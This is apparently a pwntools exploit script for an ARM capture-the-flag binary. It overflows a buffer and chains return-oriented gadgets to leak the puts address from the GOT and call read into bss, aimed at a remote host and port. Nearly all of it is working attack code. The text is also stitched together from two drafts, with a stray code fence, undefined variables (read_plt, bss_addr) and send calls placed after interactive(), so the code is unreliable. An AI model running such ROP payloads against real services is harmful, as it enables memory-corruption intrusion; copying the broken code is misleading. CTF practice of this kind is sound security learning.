from pwn import *

#io = process('./chall')
elf = ELF('./chall')
#io = remote('47.108.29.107',10454)
io = process(["qemu-arm", "-g", "12345","-L","/usr/arm-linux-gnueabi", "./chall"])
context.log_level = 'debug'
puts_plt = 0x000104AC
puts_got = 0x2101C
main_addr = 0x00010B6C

io.recvuntil(b'>')
buf = b's1mpl3Dec0d4r'
io.sendline(buf)

io.recvuntil(b'comment> ')
payload = b'a'*0x2c
rop = payload + p32(0x00010cb0) + p32(0) + p32(puts_got) + p32(0) + p32(puts_got) + p32(0)*3 + p32(0x0010C94) + p32(0)*7 + p32(main_addr)

```
from pwn import *

#io = process('./chall')
elf = ELF('./chall')
io = remote('47.108.29.107',10454)
# io = process(["qemu-arm", "-g", "12345","-L","/usr/arm-linux-gnueabi", "./chall"])
context.log_level = 'debug'
puts_plt = 0x000104AC
puts_got = 0x2101C
main_addr = 0x00010B6C

io.recvuntil(b'>')
#buf = b's1mpl3Dec0d4r'
buf = b's1mpl3Dec0d4r'
io.sendline(buf)

io.recvuntil(b'comment> ')
payload = b'a'*0x2c
#read(0,bss,0x100)
rop =  p32(0x00010cb0) + p32(0) + p32(read_plt) + p32(0) + p32(0) + p32(bss_addr) + p32(0x100) + p32(0) + p32(0x0010C94) 
rop += p32(0)*7 + p32(main_addr)
payload = payload + rop
io.send(payload)

# 接libc
'''
 ADD     R4, R4, #1
.text:00010C94 04 30 95 E4                   LDR     R3, [R5],#4
.text:00010C98 09 20 A0 E1                   MOV     R2, R9
.text:00010C9C 08 10 A0 E1                   MOV     R1, R8
.text:00010CA0 07 00 A0 E1                   MOV     R0, R7
.text:00010CA4 33 FF 2F E1                   BLX     R3
.text:00010CA4
.text:00010CA8 04 00 56 E1                   CMP     R6, R4
.text:00010CAC F7 FF FF 1A                   BNE     loc_10C90
.text:00010CAC
.text:00010CB0 F0 87 BD E8                   POP     {R4-R10,PC}'''

io.interactive()

io.send(rop)

io.interactive()
